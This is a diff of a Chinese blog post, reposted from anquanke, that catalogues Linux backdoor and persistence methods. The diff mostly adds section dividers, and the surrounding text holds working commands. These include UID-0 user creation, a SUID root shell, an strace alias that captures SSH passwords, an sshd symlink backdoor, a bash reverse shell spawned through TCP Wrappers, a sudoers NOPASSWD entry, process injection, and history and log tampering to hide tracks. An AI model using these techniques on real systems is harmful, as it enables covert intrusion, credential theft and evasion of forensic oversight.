@@ -1,13 +1,12 @@
 ---
 title: Linux后门常用方法
-copyright: true
 date: 2020-03-12 12:00:32
 tags: 安全
 categories:  "安全"
 ---
 
 ---
-​		本文为转载，原文链接 https://www.anquanke.com/post/id/155943
+​		本文转载自 https://www.anquanke.com/post/id/155943
 
 ​		在一次渗透中，成功获取某目标几台比较重要的机器，当时只想着获取脱库，结果动静太大被发现了，之前渗透并没太在意Linux维持权限，经过此次事后从Google找各种资料，一款满意的rootkit都没有，现在一直在关注这方面，但还是没有找到满意的后门，在渗透圈一个人的资源总是有限往往你全力追求的，也不过是别人的一层关系就可以解决得到更有力的资源。
 
@@ -27,6 +26,12 @@ categories:  "安全"
 - 共享库文件
 - 工具包rootkit
 - 可装载内枋模块(LKM)
+
+
+
+------
+
+
 
 ## 增加超级用户
 
@@ -74,6 +79,12 @@ echo "123456n123456" |(sudo passwd roo1)
 useradd -u 0 -o -g root -G root  user2  |echo -e "1qaz2wsxn1qaz2wsx"|passwd user1
 ```
 
+
+
+------
+
+
+
 ## 破解
 
 获得shadow文件后，用`John the Ripper`工具破解薄弱的用户密码，根据我所使用的情况下只能破解一些简单常用密码其它密码很难跑出来。
@@ -88,7 +99,11 @@ useradd -u 0 -o -g root -G root  user2  |echo -e "1qaz2wsxn1qaz2wsx"|passwd user
 `NVIDIA技嘉GTX1070 Founders Edition 8G| 4张 32G GPU`
 对于跑Windows密码还是非常快，而遇到Linux加密算法是非常蛋疼，如有需要可以贴出来搭建GPU破解服务器文章。
 
- 
+
+
+------
+
+
 
 ## 放置SUID Shell
 
@@ -101,6 +116,10 @@ chmod u+s /dev/.rootshell
 ```
 
  
+
+------
+
+
 
 ## Crontab后门
 
@@ -115,6 +134,10 @@ crontab命令被用来提交和管理用户的需要周期性执行的任务，�
 ```
 
  
+
+------
+
+
 
 ## ssh 公钥免密
 
@@ -133,6 +156,10 @@ chmod 700 ~/.ssh
 
  
 
+------
+
+
+
 ## alias 后门
 
 当前用户目录下`.bashrc`
@@ -142,6 +169,10 @@ alias ssh='strace -o /tmp/sshpwd-`date '+%d%h%m%s'`.log -e read,write,connect -s
 ```
 
  
+
+------
+
+
 
 ## pam 后门 or openssh
 
@@ -181,12 +212,20 @@ Centos6可以使用后门，但是配合curl把登录密码发送到服务器失
 
  
 
+------
+
+
+
 ## SSH后门
 
 `ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=31337`
 执行完之后，任何一台机器`ssh root@IP -p 31337`不需要密码
 
  
+
+------
+
+
 
 ## SSH wrapper后门简介
 
@@ -206,11 +245,21 @@ chmod u+x sshd
 `socat STDIO TCP4:target_ip:22,sourceport=13377`
 默认端口为13377。
 
+
+
+------
+
+
+
 ## mafix rootkit
 
 Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现让攻击者远程登陆的，特点是配置简单并可以自定义验证密码和端口号。
 
 不知道我测试是否有问题很多系统不被支持
+
+
+
+------
 
 
 
@@ -222,6 +271,10 @@ Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏�
 用`trojan`程序替换`in.telnetd、in.rexecd`等 inted的服务程序重定向login程序
 
  
+
+------
+
+
 
 ## TCP/UDP/ICMP Shell
 
@@ -238,6 +291,10 @@ http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz
 `./ish -i 65535 -t 0 -p 1024 192.168.1.69`
 
 [这个是py版的]: https://github.com/inquisb/icmpsh/blob/master/icmpsh_m.py
+
+
+
+------
 
 
 
@@ -261,6 +318,12 @@ http://prdownloads.sourceforge.net/icmpshell/ish-v0.2.tar.gz
 
 [参考]: http://vinc.top/2016/09/28/linux%E4%B8%8Bicmp%E5%90%8E%E9%97%A8prism/
 [其他文章]: https://bbs.pediy.com/thread-218557.htm?source=1
+
+
+
+------
+
+
 
 ## 共享库文件
 
@@ -286,6 +349,10 @@ mkdir … 创建名字为 … 的文件夹
 
  
 
+-----
+
+
+
 ## Git hooks
 
 原是XTERM反弹Shell，老外与Git结合
@@ -303,6 +370,10 @@ git commit -am "Test"
 ```
 
  
+
+------
+
+
 
 ## PROMPT_COMMAND后门
 
@@ -335,6 +406,12 @@ while 1:
  c.send(r)
 ```
 
+
+
+------
+
+
+
 ## PROMPT_COMMAND提权
 
 这个只是留做后门,有些黑客则是利用这点来进行提权。
@@ -359,6 +436,10 @@ script -t -f -q 2>/wow/$USER-$UID-`date +%Y%m%d%H%M%S`.time -a /wow/$USER-$UID-`
 
  
 
+------
+
+
+
 ## Sudoers “trick”
 
 其实Sudoers并不算后门,是一个Linux用户控制权限
@@ -370,6 +451,12 @@ sudo su -c "echo 'mx7krshell ALL = NOPASSWD: ALL' >> /etc/sudoers.d/README"
 
 [参考](https://segmentfault.com/a/1190000007394449)
 
+
+
+------
+
+
+
 ## TCP Wrappers
 
 TCP_Wrappers是一个工作在应用层的安全工具，它只能针对某些具体的应用或者服务起到一定的防护作用。比如说ssh、telnet、FTP等服务的请求，都会先受到TCP_Wrappers的拦截。
@@ -379,6 +466,12 @@ TCP_Wrappers有一个TCP的守护进程叫作tcpd。以telnet为例，每当有t
 ```
 ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp//443 0>&1") & :allow
 ```
+
+
+
+------
+
+
 
 ## nmap nse后门
 
@@ -407,11 +500,21 @@ import socket,subprocess,os;host='127.0.0.1';port=443;s=socket.socket(socket.AF_
 
 
 
+------
+
+
+
 ## 进程注入
 
 cymothoa进程注入后门
 
 ./cymothoa -p 1014 -s 0 -y 8888
+
+
+
+------
+
+
 
 ## 清理
 
@@ -423,11 +526,19 @@ export HISTSIZE=0export HISTFILE=/dev/null
 
  
 
+------
+
+
+
 ## 修改上传文件时间戳
 
 touch -r 老文件时间戳 新文件时间戳
 
  
+
+------
+
+
 
 ## 伪造Apache日志中的指定IP
 
@@ -435,6 +546,10 @@ sed –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/ access.log
 sed –i ‘s/192.168.1.3/192.168.1.4/g’ /var/log/apache/error_log
 
  
+
+------
+
+
 
 ## Linux日志清除
 
@@ -482,6 +597,7 @@ https://github.com/JonGates/jon
 
 参考链接:
 
-[]: https://www.slideshare.net/ulissescastro/50-ton-of-backdoors?from_action=save
-[linux一种无文件后门技巧(译文)]: https://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9
+ https://www.slideshare.net/ulissescastro/50-ton-of-backdoors?from_action=save
+
+https://kevien.github.io/2018/02/20/linux%E4%B8%80%E7%A7%8D%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9
 
